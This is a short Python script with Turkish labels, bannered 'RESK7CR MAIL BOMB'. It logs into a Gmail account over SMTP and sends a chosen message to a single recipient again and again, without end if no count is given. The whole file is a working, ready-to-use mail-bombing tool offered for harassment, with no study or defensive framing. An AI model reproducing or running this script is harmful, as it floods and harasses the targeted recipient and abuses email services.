import smtplib
import os
from email.mime.text import MIMEText

def temizle():
    os.system('clear')

def baslik_yazdir():
    temizle()
    print("====================================================")
    print("                RESK7CR MAIL BOMB                   ")
    print("             @resk7cr  --  @linuxsquad              ")
    print("====================================================\n")

def mail_gonder():
    while True:
        baslik_yazdir()
        
        gonderen = input("Gönderen Gmail: ")
        sifre = input("App Şifresi: ")
        alici = input("Alıcı: ")
        konu = input("Konu: ")
        mesaj = input("Mesaj: ")
        adet_input = input("Kaç adet (Sonsuz için boş bırak): ")
        
        sonsuz = True if adet_input == "" else False
        try:
            adet = int(adet_input) if not sonsuz else 0
        except ValueError:
            adet = 0

        print("\n[!] Bağlanılıyor...")
        
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(gonderen, sifre)
            
            print(f"[+] Gönderim başladı...")
            
            i = 1
            while True:
                if not sonsuz and i > adet:
                    break
                    
                msg = MIMEText(mesaj)
                msg['Subject'] = konu
                msg['From'] = gonderen
                msg['To'] = alici
                
                try:
                    server.sendmail(gonderen, alici, msg.as_string())
                    print(f"[{i}] Gönderildi.")
                except Exception as e:
                    print(f"[{i}] Hata: {e}")
                
                i += 1
                
            server.quit()
            print("\n[+] İşlem tamamlandı! Yeniden başa dönülüyor...")
            input("[!] Devam etmek için Enter'a basın...")
            
        except Exception as e:
            print(f"\n[!] Bağlantı hatası: {e}")
            input("\nTekrar denemek için Enter'a bas...")

if __name__ == "__main__":
    mail_gonder()
